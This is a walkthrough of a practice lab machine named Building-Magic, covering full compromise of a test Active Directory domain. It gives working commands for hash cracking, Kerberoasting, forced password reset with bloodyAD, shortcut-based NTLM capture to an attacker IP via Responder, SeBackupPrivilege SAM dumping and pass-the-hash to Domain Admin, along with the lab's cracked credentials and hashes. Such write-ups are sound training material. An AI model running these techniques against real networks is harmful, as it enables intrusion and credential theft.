=  Building-Magic Machine Write-Up

*Author* Colosion

*Difficulty* easy -> medium

:toc:
:toclevels: 3

== Table of Contents
- <<scope,Scope and Objective (given)>>
- <<enumeration,Enumeration>>
- <<ad-enum,AD Enumeration>>
- <<ad-access,AD Enumeration & Access>>
- <<privesc,Privilege Escalation>>
- <<notes,Final Notes>>

[[scope]]
== Scope and Objective (given)
*Objective*: As a penetration tester on the Hack Smarter Red Team, your objective is to achieve a full compromise of the Active Directory environment.

*Initial Access*: A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.

*Execution*: Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.

* buildingmagic.local
* dc01.buildingmagic.local

*Leaked Database File*
[source]
----
id	username	full_name	role		                password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner	      8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		     bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		      4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	  078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	     eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	        dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	 bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	   47d23284395f618bea1959e710bc68ef
----
Credential Analysis & Validation

* The Initial Compromise: The lab begins with a leaked database of credentials, a common scenario in real-world pentesting. The leaked passwords are non-salted hashes, making them vulnerable to cracking.
* Non-Salted Hashes: These are password hashes created without adding a unique, random string (salt). This allows identical passwords to produce identical hashes, making them easy to crack with pre-computed "rainbow tables" and online services like CrackStation.net.
* Hash Cracking: By using a hash cracking service, two valid passwords were found.
* Credential Validation with NetExec (nxc): The nxc tool is used to test if the cracked credentials are valid within the Active Directory environment.
* Command: `nxc smb <target_domain> -u <username> -p <password> --shares`
* Purpose: This command attempts to authenticate to the target machine's SMB service using the provided username and password. The `--shares` flag lists accessible shares if authentication is successful, confirming the credentials are valid.

[[enumeration]]
== Enumeration
Leaked database gives a opportunity to crack passwords to exist users in target system

*NOTE* First process given information after `nmap` scan

=== Passwords cracking && find valiable users

* First way

Here put a list of hashed passwords and Crack Station finds matches

Visit a site:
https://crackstation.net


image::CrackStation.png[alt text , width=600 , height=400]

* Second way

By using tool `hashcat` crack list of hashed passwords also to identify hash use `hashid`

[source]
----
hashid hash_pass.txt
----

So by identifing it's `MD5` hash

[source]
----
hashcat -m 0 -a 0 hash_pass.txt /home/kali/wordlists/passwords/rockyou.txt --keep-guessing -O
----

*-m* | hash cracking mode `MD5`

*-a* | brute-force or others mode `0`

*--keep-guessing* | don't stop if you find valid hash

////
image::hashcat.png[alt text , width=600 , height=400]
////


Rockyou wordlist does not contain pass for user `t.ren`

*Founded users and passwords*



[source]
----
r.widdleton	lilronron
t.ren		shadowhex7
----

*Validate* this users by crackmapexec or nxc by `smb`

[source]
----
crackmapexec smb 10.1.74.139  -u r.widdleton -p lilronron --shares 
#
nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --shares
----

So i got a user `r.widdleton` : `lilronron`



[[ad-enum]]
== AD Enumeration
=== BloodHound
I use it when i want to map Active Directory findings
Default commands to start bloodhound:

[source]
----
sudo neo4j start
bloodhound-python -d 'buildingmagic.local' -u 'r.widdleton' -p 'lilronron' -dc 'dc01.buildingmagic.local' -c all -ns 10.1.80.37 
----

`BloodHound` cathes information about system and save into `json` files

After starting `bloodhound-cli` - upload `json` files

=== Possible attack path
`First degree object control` found `r.haggard` as a *kerbeous* user this user has privilage to change password of `h.potch`

*ForceChangePassword* privilage means that we can change user password

If user is kerbeous we can catch his ticket.

=== Ticket catching

Start a `responder`
[source]
----
sudo responder -I tun0    
----

Catch hash by `nxc`
[source]
----
nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --kerberoasting output.txt
----

Crack password by `hashcat`
[source]
----
hashcat hash.txt /wordlists/rockyou.txt
----

Check if user is correct by `nxc`

So we had a new owned user `r.haggard` : `rubeushagrid`

=== Changing password for h.potch

As we mentioned user `r.haggard` has a *ForceChangePassword* privilage to user `h.potch`

So we can change password of `h.potch`

[source]
----
bloodyAD --host "10.1.80.37" -d 'dc01.buildingmagic.local' -u  'r.haggard' -p  'rubeushagrid' set password 'h.potch' 'fuckpass'
----

Check if user is correct by `nxc`

Owned new user `h.potch` : `fuckpass`



[[ad-access]]
== AD Enumeration & Access
=== Smb Enemuration
As we owned new user let's check smb shares

[source]
----
crackmapexec smb 10.1.80.37 -u h.potch  -p fuckpass  --shares
----

We have a write permisions on share File-Share it's a point for next steps

Using `nxc` i searched some modules and find `slinky` module 

`slinky` - Creates windows shortcuts with the icon attribute containing a `URI` to the specified  server (default SMB) in all shares with write permissions

We need only to create a link in File-Share and need wait when user open this


[source]
----
nxc smb buildingmagic.local  -M slinky -u 'h.potch' -p 'fuckpass' -o SERVER=10.200.19.165 SHARES=File-Share NAME=smarter
----

Also don't forgot to start 

[source]
----
sudo responder -I tun0
----

=== Responder and cracking

Here we go we got a `h.grangon` user hash

[source]
----
h.grangon::BUILDINGMAGIC:a295406eb06ced15:363C72585E22F1AB73DF532B1B086DD4:010100000000000000E5A97DB555DC01F6F7C4219C36D7EC0000000002000800300046003500510001001E00570049004E002D0052004E003300570052004C004B00540054004E004D0004003400570049004E002D0052004E003300570052004C004B00540054004E004D002E0030004600350051002E004C004F00430041004C000300140030004600350051002E004C004F00430041004C000500140030004600350051002E004C004F00430041004C000700080000E5A97DB555DC010600040002000000080030003000000000000000000000000040000041705E2AFC127B309B3C1BF376F40EA2F68FE965675F16F9293B07C4EEEAE32A0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00310039002E003100360035000000000000000000
----

Crack this hash by `hashcat`

[source]
----
hashcat grangon.NTLM /home/kali/wordlists/passwords/rockyou.txt 
----

Check with `nxc`  :  `validation confirmed`

Owned a new user `h.grangon` : `magic4ever`



[[privesc]]
== Privilege Escalation
=== Remote Management Users
During enumeration user `h.grangon` in bloodhound see that user exists in *Remote Management Users*

So we can try connect to machine by tool `evil-winrm`

[source]
----
evil-winrm -i 10.1.80.37 -u h.grangon -p magic4ever
----

User flag: `\Desktop\user.txt`

=== Misconfigured privileges

During post-enumeration so dangerous privileges by command

[source]
----
whoami /priv
----

Vulnerable to Privilage Escalation 

`SeBackupPrivilege  Back up files and directories  Enabled`

So we can copy `sam` and `system` and dump hashes of common users

=== SAM and SYSTEM

[source]
----
C:> download sam
#
C:> download system
----

Download `sam` and `system` and dump `secrets` by tool `impacket-secretsdump`

[source]
----
impacket-secretsdump -sam sam -system system local 
----

Obtain hashes of default users

[source]
----
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
----

After several tries to login as `Administrator` by him hash it returns failture so maybe exist anouther user in system

[source]
----
net users
----

Enumerated user `a.flatch`

Also it can be possible that user `a.flatch` uses the same password which have Administrator

[source]
----
evil-winrm -i dc01.buildingmagic.local -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce'
----

User 'a.flatch' exists in group Domain Admins so system is obtained 

Root flag: `\Administrator\Desktop\root.txt`

Congratulations 




[[notes]]
== Final Notes
Sourse with good info about Active Directory

https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
